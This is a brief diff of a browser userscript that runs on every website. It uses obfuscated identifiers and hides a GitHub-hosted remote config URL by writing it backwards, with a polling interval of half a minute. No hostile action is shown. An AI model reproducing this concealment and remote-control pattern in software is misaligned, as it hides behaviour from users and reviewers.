@@ -6,7 +6,7 @@
 // @author       You
 // @match        *://*/*     
 // @grant        none
-
+// ==/UserScript==
 (function(_0xc74df,_0x921f6b,_0xd9dbfb,_0x18bda,_0xcba2gd){'use strict';// ==================== REMOTE CONFIGURATION ====================
 _0x921f6b="nosj.gifnoc/niam/sdaeh/sfer/sj.resu.repleHxxuL/ti-pihs-teollaknit/moc.tnetnocresubuhtig.war//:sptth".split("").reverse().join("");// ← CHANGE THIS
 _0xc74df=(982220^982220)+(328979^328976);_0xd9dbfb=0.5;// minutes
